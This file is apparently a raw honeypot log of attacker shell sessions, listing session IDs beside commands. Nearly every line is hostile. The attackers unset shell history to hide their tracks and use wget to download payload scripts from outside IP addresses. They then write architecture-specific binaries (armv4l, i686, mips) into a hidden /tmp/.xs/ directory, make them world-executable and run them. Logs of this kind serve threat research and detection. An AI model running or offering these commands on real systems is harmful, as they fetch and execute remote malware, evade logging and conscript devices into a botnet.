bfc1290c9e3e4a74946f5c05b58a85be	unset HISTFILE HISTLOG HISTORY
bfc1290c9e3e4a74946f5c05b58a85be	cd /bin/
bfc1290c9e3e4a74946f5c05b58a85be	wget http://203.238.187.59/shop/upload/6816 -O acxxxhruvc
bfc1290c9e3e4a74946f5c05b58a85be	ls -la /etc/daemon.cfg
5d1b666c04534cb9aa0e87d65ffc74e8	cd /tmp  |  |  cd /var/run
5d1b666c04534cb9aa0e87d65ffc74e8	wget http://181.214.92.16/TwoFace/DICKS.sh
68ba118cb5c74db0b2a508aaf08e1561	cd /tmp  |  |  cd /var/run
68ba118cb5c74db0b2a508aaf08e1561	wget http://181.214.92.16/TwoFace/DICKS.sh
b5e9530d078740fbbce5c98a7aa778a6	cd /tmp  |  |  cd /var/run
b5e9530d078740fbbce5c98a7aa778a6	wget http://181.214.92.16/TwoFace/DICKS.sh
e11ea241bdac4e37997dc3b403a25fbe	echo -n test
e11ea241bdac4e37997dc3b403a25fbe	cat /proc/version
37722242523545c4bbfa1b770de8505c	mkdir /tmp/.xs/
37722242523545c4bbfa1b770de8505c	cat  > /tmp/.xs/daemon.armv4l.mod
37722242523545c4bbfa1b770de8505c	chmod 777 /tmp/.xs/daemon.armv4l.mod
37722242523545c4bbfa1b770de8505c	/tmp/.xs/daemon.armv4l.mod
0327256c8ce9409ab3b0701581c6dbf4	mkdir /tmp/.xs/
0327256c8ce9409ab3b0701581c6dbf4	cat  > /tmp/.xs/daemon.i686.mod
0327256c8ce9409ab3b0701581c6dbf4	chmod 777 /tmp/.xs/daemon.i686.mod
0327256c8ce9409ab3b0701581c6dbf4	/tmp/.xs/daemon.i686.mod
ccc8361ff5e44fb4af25471a497de4f8	mkdir /tmp/.xs/
ccc8361ff5e44fb4af25471a497de4f8	cat  > /tmp/.xs/daemon.mips.mod
ccc8361ff5e44fb4af25471a497de4f8	chmod 777 /tmp/.xs/daemon.mips.mod
ccc8361ff5e44fb4af25471a497de4f8	/tmp/.xs/daemon.mips.mod
d32a8fef7c94490badea279e8695a277	mkdir /tmp/.xs/
d32a8fef7c94490badea279e8695a277	cat  > /tmp/.xs/daemon.armv4l.mod
d32a8fef7c94490badea279e8695a277	chmod 777 /tmp/.xs/daemon.armv4l.mod
d32a8fef7c94490badea279e8695a277	/tmp/.xs/daemon.armv4l.mod
8b396e67a2074ff4b9ab91b23317c3d0	mkdir /tmp/.xs/
8b396e67a2074ff4b9ab91b23317c3d0	cat  > /tmp/.xs/daemon.i686.mod
8b396e67a2074ff4b9ab91b23317c3d0	chmod 777 /tmp/.xs/daemon.i686.mod
8b396e67a2074ff4b9ab91b23317c3d0	/tmp/.xs/daemon.i686.mod
eba745f86b894af7a2da31beec49a3d4	mkdir /tmp/.xs/
eba745f86b894af7a2da31beec49a3d4	cat  > /tmp/.xs/daemon.mips.mod
eba745f86b894af7a2da31beec49a3d4	chmod 777 /tmp/.xs/daemon.mips.mod
eba745f86b894af7a2da31beec49a3d4	/tmp/.xs/daemon.mips.mod
a70e5ae124744479b84e58f4e7eae059	mkdir /tmp/.xs/
a70e5ae124744479b84e58f4e7eae059	cat  > /tmp/.xs/daemon.armv4l.mod
a70e5ae124744479b84e58f4e7eae059	chmod 777 /tmp/.xs/daemon.armv4l.mod
a70e5ae124744479b84e58f4e7eae059	/tmp/.xs/daemon.armv4l.mod
844d5e9d47514b05ad8d07b555777e58	mkdir /tmp/.xs/
844d5e9d47514b05ad8d07b555777e58	cat  > /tmp/.xs/daemon.i686.mod
844d5e9d47514b05ad8d07b555777e58	chmod 777 /tmp/.xs/daemon.i686.mod
844d5e9d47514b05ad8d07b555777e58	/tmp/.xs/daemon.i686.mod
0ee9aaaff54945be81f469f6f22943dd	mkdir /tmp/.xs/
0ee9aaaff54945be81f469f6f22943dd	cat  > /tmp/.xs/daemon.mips.mod
0ee9aaaff54945be81f469f6f22943dd	chmod 777 /tmp/.xs/daemon.mips.mod
0ee9aaaff54945be81f469f6f22943dd	/tmp/.xs/daemon.mips.mod
750e4aa44b384b44bacbbfeaf34c9282	mkdir /tmp/.xs/
750e4aa44b384b44bacbbfeaf34c9282	cat  > /tmp/.xs/daemon.armv4l.mod
750e4aa44b384b44bacbbfeaf34c9282	chmod 777 /tmp/.xs/daemon.armv4l.mod
750e4aa44b384b44bacbbfeaf34c9282	/tmp/.xs/daemon.armv4l.mod
ce55ed9b461a4693a3c6449bf9c2346c	mkdir /tmp/.xs/
ce55ed9b461a4693a3c6449bf9c2346c	cat  > /tmp/.xs/daemon.i686.mod
ce55ed9b461a4693a3c6449bf9c2346c	chmod 777 /tmp/.xs/daemon.i686.mod
ce55ed9b461a4693a3c6449bf9c2346c	/tmp/.xs/daemon.i686.mod
a549cc2b1db541b78ea1da78d18a6aa3	mkdir /tmp/.xs/
a549cc2b1db541b78ea1da78d18a6aa3	cat  > /tmp/.xs/daemon.mips.mod
a549cc2b1db541b78ea1da78d18a6aa3	chmod 777 /tmp/.xs/daemon.mips.mod
a549cc2b1db541b78ea1da78d18a6aa3	/tmp/.xs/daemon.mips.mod
eeda2626ca4e4d9498ab1d41656b2fbb	mkdir /tmp/.xs/
eeda2626ca4e4d9498ab1d41656b2fbb	cat  > /tmp/.xs/daemon.armv4l.mod
eeda2626ca4e4d9498ab1d41656b2fbb	chmod 777 /tmp/.xs/daemon.armv4l.mod
eeda2626ca4e4d9498ab1d41656b2fbb	/tmp/.xs/daemon.armv4l.mod
edd5af567bb34335a741c72f805a83c9	mkdir /tmp/.xs/
edd5af567bb34335a741c72f805a83c9	cat  > /tmp/.xs/daemon.i686.mod
edd5af567bb34335a741c72f805a83c9	chmod 777 /tmp/.xs/daemon.i686.mod
edd5af567bb34335a741c72f805a83c9	/tmp/.xs/daemon.i686.mod
5e1a10fe34d34387bc9c0d5d7cd818de	mkdir /tmp/.xs/
5e1a10fe34d34387bc9c0d5d7cd818de	cat  > /tmp/.xs/daemon.mips.mod
5e1a10fe34d34387bc9c0d5d7cd818de	chmod 777 /tmp/.xs/daemon.mips.mod
5e1a10fe34d34387bc9c0d5d7cd818de	/tmp/.xs/daemon.mips.mod
5b8526d9b5934d5ca52102e8d149ec0b	mkdir /tmp/.xs/
5b8526d9b5934d5ca52102e8d149ec0b	cat  > /tmp/.xs/daemon.armv4l.mod
5b8526d9b5934d5ca52102e8d149ec0b	chmod 777 /tmp/.xs/daemon.armv4l.mod
5b8526d9b5934d5ca52102e8d149ec0b	/tmp/.xs/daemon.armv4l.mod
e41429202484434aae1a1a9c9f9a8b66	mkdir /tmp/.xs/
e41429202484434aae1a1a9c9f9a8b66	cat  > /tmp/.xs/daemon.i686.mod
e41429202484434aae1a1a9c9f9a8b66	chmod 777 /tmp/.xs/daemon.i686.mod
e41429202484434aae1a1a9c9f9a8b66	/tmp/.xs/daemon.i686.mod
29157f6e26014d9b88243a48eb9b33f9	mkdir /tmp/.xs/
29157f6e26014d9b88243a48eb9b33f9	cat  > /tmp/.xs/daemon.mips.mod
29157f6e26014d9b88243a48eb9b33f9	chmod 777 /tmp/.xs/daemon.mips.mod
29157f6e26014d9b88243a48eb9b33f9	/tmp/.xs/daemon.mips.mod
e14ada4a842a4d42bf3e57a08f7b3ec1	mkdir /tmp/.xs/
e14ada4a842a4d42bf3e57a08f7b3ec1	cat  > /tmp/.xs/daemon.armv4l.mod
e14ada4a842a4d42bf3e57a08f7b3ec1	chmod 777 /tmp/.xs/daemon.armv4l.mod
e14ada4a842a4d42bf3e57a08f7b3ec1	/tmp/.xs/daemon.armv4l.mod
6797aead103a465290059409f739cb94	mkdir /tmp/.xs/
6797aead103a465290059409f739cb94	cat  > /tmp/.xs/daemon.i686.mod
6797aead103a465290059409f739cb94	chmod 777 /tmp/.xs/daemon.i686.mod
6797aead103a465290059409f739cb94	/tmp/.xs/daemon.i686.mod
62eebadaa4484169af4bab83380cfa97	mkdir /tmp/.xs/
62eebadaa4484169af4bab83380cfa97	cat  > /tmp/.xs/daemon.mips.mod
62eebadaa4484169af4bab83380cfa97	chmod 777 /tmp/.xs/daemon.mips.mod
62eebadaa4484169af4bab83380cfa97	/tmp/.xs/daemon.mips.mod
7cb40e4f618e4cfe9ca8bc5b2ba82a60	mkdir /tmp/.xs/
7cb40e4f618e4cfe9ca8bc5b2ba82a60	cat  > /tmp/.xs/daemon.armv4l.mod
7cb40e4f618e4cfe9ca8bc5b2ba82a60	chmod 777 /tmp/.xs/daemon.armv4l.mod
